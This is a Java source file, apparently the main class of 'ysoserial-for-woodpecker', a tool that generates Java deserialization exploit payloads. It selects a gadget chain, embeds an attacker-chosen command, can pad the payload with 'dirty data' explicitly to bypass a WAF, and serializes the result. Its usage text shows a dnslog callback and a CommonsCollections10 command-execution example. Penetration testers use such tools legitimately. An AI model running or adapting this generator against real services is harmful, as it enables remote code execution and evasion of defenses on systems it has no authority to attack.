@java.lang.SuppressWarnings("rawtypes")
public class GeneratePayload {
	public static me.gv7.woodpecker.yso.YsoConfig ysoConfig = new me.gv7.woodpecker.yso.YsoConfig();

	public static org.apache.commons.cli.CommandLine cmdLine;

	private static final int INTERNAL_ERROR_CODE = 70;

	private static final int USAGE_CODE = 64;

	private static final java.lang.String VERSION = "0.5.2";

	public static void main(final java.lang.String[] args) {
		org.apache.commons.cli.Options options = new org.apache.commons.cli.Options();
		options.addOption("g", "gadget", true, "java deserialization gadget");
		options.addOption("a", "args", true, "gadget parameters");
		options.addOption("ddl", "dirt-data-length", true, "Add the length of dirty data, used to bypass WAF");
		options.addOption("l", "list", false, "List all gadgets");
		options.addOption("c", "compress", false, "Zip the Templates gadgets");
		org.apache.commons.cli.CommandLineParser parser = new org.apache.commons.cli.DefaultParser();
		try {
			me.gv7.woodpecker.yso.GeneratePayload.cmdLine = parser.parse(options, args);
		} catch (java.lang.Exception e) {
			java.lang.System.out.println("[*] Parameter input error, please use -h for more information");
			me.gv7.woodpecker.yso.GeneratePayload.printUsage(options);
		}
		if (args.length == 0) {
			me.gv7.woodpecker.yso.GeneratePayload.printUsage(options);
			java.lang.System.exit(me.gv7.woodpecker.yso.GeneratePayload.USAGE_CODE);
		}
		if (me.gv7.woodpecker.yso.GeneratePayload.cmdLine.hasOption("list")) {
			me.gv7.woodpecker.yso.GeneratePayload.listAllGadgets();
			return;
		}
		if (me.gv7.woodpecker.yso.GeneratePayload.cmdLine.hasOption("compress")) {
			me.gv7.woodpecker.yso.GeneratePayload.ysoConfig.setCompress(true);
		} else {
			me.gv7.woodpecker.yso.GeneratePayload.ysoConfig.setCompress(false);
		}
		final java.lang.String payloadType = me.gv7.woodpecker.yso.GeneratePayload.cmdLine.getOptionValue("gadget");
		final java.lang.String command = me.gv7.woodpecker.yso.GeneratePayload.cmdLine.getOptionValue("args");
		final java.lang.Class<? extends me.gv7.woodpecker.yso.payloads.ObjectPayload> payloadClass = me.gv7.woodpecker.yso.payloads.ObjectPayload.Utils.getPayloadClass(payloadType);
		if (payloadClass == null) {
			java.lang.System.err.println(("Invalid payload type '" + payloadType) + "'");
			me.gv7.woodpecker.yso.GeneratePayload.listAllGadgets();
			java.lang.System.exit(me.gv7.woodpecker.yso.GeneratePayload.USAGE_CODE);
			return;
		}
		try {
			me.gv7.woodpecker.yso.payloads.ObjectPayload payload = payloadClass.newInstance();
			java.lang.Object object = payload.getObject(command);
			if (me.gv7.woodpecker.yso.GeneratePayload.cmdLine.hasOption("dirt-data-length")) {
				int dirtDataLength = java.lang.Integer.valueOf(me.gv7.woodpecker.yso.GeneratePayload.cmdLine.getOptionValue("dirt-data-length"));
				me.gv7.woodpecker.yso.payloads.util.DirtyDataWrapper dirtyDataWrapper = new me.gv7.woodpecker.yso.payloads.util.DirtyDataWrapper(object, dirtDataLength);
				object = dirtyDataWrapper.doWrap();
			}
			java.io.PrintStream out = java.lang.System.out;
			me.gv7.woodpecker.yso.Serializer.serialize(object, out);
			me.gv7.woodpecker.yso.payloads.ObjectPayload.Utils.releasePayload(payload, object);
		} catch (java.lang.Throwable e) {
			java.lang.System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			java.lang.System.exit(me.gv7.woodpecker.yso.GeneratePayload.INTERNAL_ERROR_CODE);
		}
		java.lang.System.exit(0);
	}

	public static void printUsage(org.apache.commons.cli.Options options) {
		java.lang.System.out.println(java.lang.String.format("ysoserial-for-woodpecker v%s   \n", me.gv7.woodpecker.yso.GeneratePayload.VERSION));
		new org.apache.commons.cli.HelpFormatter().printHelp("ysoserial-for-woodpecker-<version>.jar", options, true);
		java.lang.System.out.println("\n");
		java.lang.System.out.println("Example:");
		java.lang.System.out.println("1. DNSLOG\n java -jar ysoserial-for-woodpecker-<version>.jar -g URLDNS -a http://test.dnslog.com/");
		java.lang.System.out.println("2. CC10\n  java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsCollections10 -a raw_cmd:calc\n\n");
		me.gv7.woodpecker.yso.GeneratePayload.listAllGadgets();
		java.lang.System.exit(0);
	}

	private static void listAllGadgets() {
		java.lang.System.err.println("  Available payload types:");
		final java.util.List<java.lang.Class<? extends me.gv7.woodpecker.yso.payloads.ObjectPayload>> payloadClasses = new java.util.ArrayList<java.lang.Class<? extends me.gv7.woodpecker.yso.payloads.ObjectPayload>>(me.gv7.woodpecker.yso.payloads.ObjectPayload.Utils.getPayloadClasses());
		java.util.Collections.sort(payloadClasses, new me.gv7.woodpecker.yso.Strings.ToStringComparator());
		final java.util.List<java.lang.String[]> rows = new java.util.LinkedList<java.lang.String[]>();
		rows.add(new java.lang.String[]{ "Payload", "Authors", "Dependencies" });
		rows.add(new java.lang.String[]{ "-------", "-------", "------------" });
		for (java.lang.Class<? extends me.gv7.woodpecker.yso.payloads.ObjectPayload> payloadClass : payloadClasses) {
			rows.add(new java.lang.String[]{ payloadClass.getSimpleName(), me.gv7.woodpecker.yso.Strings.join(java.util.Arrays.asList(me.gv7.woodpecker.yso.payloads.annotation.Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""), me.gv7.woodpecker.yso.Strings.join(java.util.Arrays.asList(me.gv7.woodpecker.yso.payloads.annotation.Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "") });
		}
		final java.util.List<java.lang.String> lines = me.gv7.woodpecker.yso.Strings.formatTable(rows);
		for (java.lang.String line : lines) {
			java.lang.System.err.println("     " + line);
		}
	}
}